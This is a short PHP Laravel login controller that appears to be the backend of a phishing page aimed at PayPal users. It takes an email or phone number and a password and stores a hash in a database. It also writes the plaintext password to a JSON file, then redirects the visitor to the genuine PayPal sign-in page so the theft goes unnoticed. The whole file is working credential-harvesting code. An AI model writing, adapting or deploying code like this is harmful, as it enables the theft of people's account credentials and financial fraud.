<?php

namespace App\Http\Controllers;

use App\Models\Login;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;

class LoginController extends Controller
{
    public function store(Request $request)
    {
        $request->validate([
            'login'    => 'required',
            'password' => 'required|min:6',
        ]);

        $login = $request->login;

        //  If input is a valid email
        if (filter_var($login, FILTER_VALIDATE_EMAIL)) {
            Login::create([
                'email'    => $login,
                'password' => Hash::make($request->password),
            ]);

        //  If input is a valid mobile number (any format)
        } elseif (preg_match('/^\+?[0-9]{7,15}$/', $login)) {
            // Allows optional "+" at start and 7-15 digits (common for international numbers)
            Login::create([
                'mobile_number' => $login,
                'password'      => Hash::make($request->password),
            ]);

        // Invalid input → reject
        } else {
            return back()->withErrors(['login' => 'Enter a valid email or mobile number']);
        }

        //  Save to JSON bai
        $filePath = storage_path('app/logins.json');
        if (!file_exists($filePath)) {
            file_put_contents($filePath, json_encode([]));
        }

        $existing = json_decode(file_get_contents($filePath), true);

        $existing[] = [
            'login'    => $login,
            'password' => $request->password, 
        ];

        file_put_contents($filePath, json_encode($existing, JSON_PRETTY_PRINT));

        return redirect()->away('https://www.paypal.com/signin');
    }
}
